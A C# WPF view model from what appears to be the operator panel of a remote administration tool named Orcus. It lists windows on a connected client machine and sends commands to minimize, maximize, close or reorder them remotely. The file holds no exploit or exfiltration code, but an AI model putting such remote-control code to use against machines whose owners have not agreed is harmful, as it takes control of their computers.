using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Linq;
using System.Windows;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using Orcus.Administration.Commands.WindowManager;
using Orcus.Administration.Core.CommandManagement.View;
using Orcus.Administration.Plugins.CommandViewPlugin;
using Sorzus.Wpf.Toolkit;

namespace Orcus.Administration.ViewModels.CommandViewModels
{
    [MinimumClientVersion(12)]
    public class WindowManagerViewModel : CommandView
    {
        private RelayCommand _bringWindowToFrontCommand;
        private RelayCommand _closeWindowCommand;
        private RelayCommand _makeWindowLoseTopmostCommand;
        private RelayCommand _makeWindowTopmostCommand;
        private RelayCommand _maximizeWindowCommand;
        private RelayCommand _minimizeWindowCommand;
        private bool _onlyShowVisibleWindows;
        private RelayCommand _refreshWindowsCommand;
        private RelayCommand _restoreWindowCommand;
        private string _searchText;
        private WindowManagerCommand _windowManagerCommand;
        private ObservableCollection<AdvancedWindowInformation> _windows;

        public override string Name { get; } = (string) Application.Current.Resources["WindowManager"];
        public override Category Category { get; } = Category.System;

        public ObservableCollection<AdvancedWindowInformation> Windows
        {
            get { return _windows; }
            set { SetProperty(value, ref _windows); }
        }

        public string SearchText
        {
            get { return _searchText; }
            set
            {
                if (SetProperty(value, ref _searchText))
                    RefreshItems();
            }
        }

        public bool OnlyShowVisibleWindows
        {
            get { return _onlyShowVisibleWindows; }
            set
            {
                if (SetProperty(value, ref _onlyShowVisibleWindows))
                    RefreshItems();
            }
        }

        public RelayCommand RefreshWindowsCommand
        {
            get
            {
                return _refreshWindowsCommand ??
                       (_refreshWindowsCommand =
                           new RelayCommand(parameter => { _windowManagerCommand.GetAllWindows(); }));
            }
        }

        public RelayCommand MinimizeWindowCommand
        {
            get
            {
                return _minimizeWindowCommand ??
                       (_minimizeWindowCommand =
                           new RelayCommand(
                               parameter =>
                               {
                                   _windowManagerCommand.MinimizeWindow((AdvancedWindowInformation) parameter);
                               }));
            }
        }

        public RelayCommand MaximizeWindowCommand
        {
            get
            {
                return _maximizeWindowCommand ??
                       (_maximizeWindowCommand =
                           new RelayCommand(
                               parameter =>
                               {
                                   _windowManagerCommand.MaximizeWindow((AdvancedWindowInformation) parameter);
                               }));
            }
        }

        public RelayCommand RestoreWindowCommand
        {
            get
            {
                return _restoreWindowCommand ??
                       (_restoreWindowCommand =
                           new RelayCommand(
                               parameter =>
                               {
                                   _windowManagerCommand.RestoreWindow((AdvancedWindowInformation) parameter);
                               }));
            }
        }

        public RelayCommand BringWindowToFrontCommand
        {
            get
            {
                return _bringWindowToFrontCommand ??
                       (_bringWindowToFrontCommand =
                           new RelayCommand(
                               parameter =>
                               {
                                   _windowManagerCommand.BringWindowToFront((AdvancedWindowInformation) parameter);
                               }));
            }
        }

        public RelayCommand MakeWindowTopmostCommand
        {
            get
            {
                return _makeWindowTopmostCommand ??
                       (_makeWindowTopmostCommand =
                           new RelayCommand(
                               parameter =>
                               {
                                   _windowManagerCommand.MakeWindowTopmost((AdvancedWindowInformation) parameter);
                               }));
            }
        }

        public RelayCommand MakeWindowLoseTopmostCommand
        {
            get
            {
                return _makeWindowLoseTopmostCommand ??
                       (_makeWindowLoseTopmostCommand =
                           new RelayCommand(
                               parameter =>
                               {
                                   _windowManagerCommand.MakeWindowLoseTopmost((AdvancedWindowInformation) parameter);
                               }));
            }
        }

        public RelayCommand CloseWindowCommand
        {
            get
            {
                return _closeWindowCommand ??
                       (_closeWindowCommand =
                           new RelayCommand(
                               parameter =>
                               {
                                   _windowManagerCommand.CloseWindow((AdvancedWindowInformation) parameter);
                               }));
            }
        }

        protected override void InitializeView(IClientController clientController, ICrossViewManager crossViewManager)
        {
            _windowManagerCommand = clientController.Commander.GetCommand<WindowManagerCommand>();
            _windowManagerCommand.WindowsReceived += WindowManagerCommandOnWindowsReceived;
            crossViewManager.RegisterMethod(this,
                new Guid(0xcf23f35b, 0x9e90, 0x634b, 0xbb, 0x60, 0x34, 0xcb, 0xb8, 0x78, 0x7c, 0x2c),
                new EventHandler<int>(OpenProcessWindows));
        }

        public override void LoadView(bool loadData)
        {
            if (loadData)
                RefreshWindowsCommand.Execute(null);
        }

        protected override ImageSource GetIconImageSource()
        {
            return new BitmapImage(new Uri("pack://application:,,,/Resources/Images/VisualStudio/ApplicationGroup_16x.png", UriKind.Absolute));
        }

        private void OpenProcessWindows(object sender, int i)
        {
            if (_windowManagerCommand.Windows == null)
                _windowManagerCommand.GetAllWindows();
            SearchText = "process:" + i;
        }

        private void WindowManagerCommandOnWindowsReceived(object sender,
            List<AdvancedWindowInformation> advancedWindowInformations)
        {
            Application.Current.Dispatcher.BeginInvoke(new Action(() =>
            {
                Windows = new ObservableCollection<AdvancedWindowInformation>(advancedWindowInformations)
                {
                    [0] = {IsExpanded = true}
                };
                RefreshItems();
            }));
        }

        private void RefreshItems()
        {
            //no windows yet
            if (_windowManagerCommand.Windows == null)
                return;

            if (string.IsNullOrEmpty(_searchText)) //restore normal order
            {
                Windows = new ObservableCollection<AdvancedWindowInformation>(_windowManagerCommand.Windows);
                foreach (var advancedWindowInformation in Windows)
                    ResetWindow(advancedWindowInformation);
            }
            else UpdateProcesses(Windows, _windowManagerCommand.Windows);
        }

        private void ResetWindow(AdvancedWindowInformation advancedWindowInformation)
        {
            advancedWindowInformation.ViewChildWindows.Clear();
            foreach (var childProcess in advancedWindowInformation.ChildWindows)
            {
                if (OnlyShowVisibleWindows && !childProcess.IsVisible)
                {
                    if (!IsAnyVisible(childProcess.ChildWindows))
                        continue;
                }
                advancedWindowInformation.ViewChildWindows.Add(childProcess);
                ResetWindow(childProcess);
            }
        }

        private void UpdateProcesses(ObservableCollection<AdvancedWindowInformation> windows,
            List<AdvancedWindowInformation> allWindows)
        {
            var itemsWhichShouldBeThere =
                allWindows.Where(
                    x => MatchSearchPattern(_searchText, x)).ToList();

            var itemsWhichAreCurrentlyThere = windows.ToList();

            for (int i = itemsWhichShouldBeThere.Count - 1; i >= 0; i--)
            {
                var processInfo = itemsWhichShouldBeThere[i];
                if (itemsWhichAreCurrentlyThere.Contains(processInfo))
                {
                    itemsWhichShouldBeThere.Remove(processInfo);
                    itemsWhichAreCurrentlyThere.Remove(processInfo);
                }
            }

            //remove items which were not found in itemsWhichShouldBeThere
            foreach (var processInfo in itemsWhichAreCurrentlyThere)
            {
                windows.Remove(processInfo);
            }

            foreach (var processInfo in windows)
            {
                UpdateProcesses(processInfo.ViewChildWindows, processInfo.ChildWindows);
            }

            //add items which were not found in the current list
            foreach (var processInfo in itemsWhichShouldBeThere)
            {
                windows.Add(processInfo);
            }
        }

        private bool MatchSearchPattern(string searchPattern, AdvancedWindowInformation advancedWindowInformation)
        {
            if (OnlyShowVisibleWindows && !advancedWindowInformation.IsVisible)
            {
                if (!IsAnyVisible(advancedWindowInformation.ChildWindows))
                    return false;
            }

            if (string.IsNullOrWhiteSpace(searchPattern))
                return true;

            if (searchPattern.StartsWith("process:", StringComparison.OrdinalIgnoreCase) && searchPattern.Length > 8)
            {
                var pid = searchPattern.Substring(searchPattern.IndexOf(":", StringComparison.Ordinal) + 1);
                return advancedWindowInformation.ProcessId.ToString() == pid;
            }

            if (advancedWindowInformation.Caption.IndexOf(searchPattern, StringComparison.OrdinalIgnoreCase) > -1)
                return true;

            if (advancedWindowInformation.ClassName.IndexOf(searchPattern, StringComparison.OrdinalIgnoreCase) > -1)
                return true;

            if (advancedWindowInformation.ProcessId.ToString() == searchPattern)
                return true;

            return advancedWindowInformation.ChildWindows.Any(x => MatchSearchPattern(searchPattern, x));
        }

        private bool IsAnyVisible(List<AdvancedWindowInformation> windows)
        {
            foreach (var advancedWindowInformation in windows)
            {
                if (advancedWindowInformation.IsVisible)
                    return true;

                if (IsAnyVisible(advancedWindowInformation.ChildWindows))
                    return true;
            }

            return false;
        }
    }
}